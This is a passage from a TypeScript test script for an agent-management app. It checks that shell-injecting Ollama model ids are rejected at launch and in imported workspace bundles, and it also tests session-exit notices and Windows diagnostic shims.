  !rejects('agent:update', agentUpdate('llama3:8b'))
  && !rejects('agent:update', agentUpdate('hf.co/org/repo:Q4_K_M')));

check('resolveLaunchCommand fails closed instead of interpolating a shell payload', (() => {
  try {
    resolveLaunchCommand({
      runtime: 'ollama', permissionMode: 'default', ollamaModel: INJECTING_MODEL,
    });
    return false;
  } catch (error) {
    return error instanceof Error && error.message.includes('unsafe Ollama model id');
  }
})());

check('resolveLaunchCommand still builds the ordinary Ollama command',
  resolveLaunchCommand({
    runtime: 'ollama', permissionMode: 'default', ollamaModel: 'llama3:8b',
  }).includes('llama3:8b'));

const bundleWith = (ollamaModel: string): unknown => ({
  format: 'ade-workspace-bundle', version: 1, exportedAt: '2026-08-01T00:00:00.000Z',
  sourcePlatform: 'linux', repositories: [], assets: [], notices: [], agentTemplates: [],
  categories: [{ id: 'cat', name: 'Cat', agentIds: ['ag'] }],
  agents: [{
    id: 'ag', categoryId: 'cat', name: 'Agent', runtime: 'ollama', permissionMode: 'default',
    ollamaModel, sourceHomeBackend: 'native', sourceHomePathStyle: 'posix',
  }],
  settings: {
    theme: 'dark',
    memory: { enabled: true, userProfileEnabled: true, memoryCharLimit: 1, userCharLimit: 1 },
  },
});

check('a workspace bundle carrying an injecting model id fails to parse', (() => {
  try {
    parseWorkspaceBundle(bundleWith(INJECTING_MODEL));
    return false;
  } catch (error) {
    return error instanceof Error && error.message.includes('ollamaModel');
  }
})());

check('the same bundle parses once the model id is a plain one',
  parseWorkspaceBundle(bundleWith('llama3:8b')).agents[0]?.ollamaModel === 'llama3:8b');

function session(overrides: Partial<SessionMeta>): SessionMeta {
  return {
    id: 's',
    agentId: 'a',
    title: 'Task',
    kind: 'task',
    status: 'exited',
    createdAt: 1,
    endedAt: 2,
    exitCode: 0,
    exitReason: 'exit',
    ...overrides,
  };
}

check('successful tasks produce a completion notice',
  sessionExitNotice(session({}), 'Writer')?.title === 'Writer completed a task');
check('failed sessions include the exit code',
  sessionExitNotice(session({ kind: 'interactive', exitCode: 7 }), 'Coder')?.body.includes('7') === true);
check('cancelled and clean interactive exits stay quiet',
  sessionExitNotice(session({ exitReason: 'cancelled' }), 'Agent') === null
  && sessionExitNotice(session({ kind: 'interactive', exitCode: 0 }), 'Agent') === null);

async function finish(): Promise<void> {
  if (process.platform === 'win32') {
    const result = await runDiagnosticCommand(
      join(process.cwd(), 'scripts/fixtures/diagnostic-shim.cmd'),
      ['--version'],
    );
    check('Windows CLI diagnostics execute resolved .cmd shims',
      result.code === 0 && result.stdout.includes('ade-diagnostic-shim 1.0.0'), result);
  }
  console.log(`\n${failed ? 'FAILED' : 'PASSED'} - ${passed} passed, ${failed} failed`);
  process.exit(failed ? 1 : 0);
}

void finish();
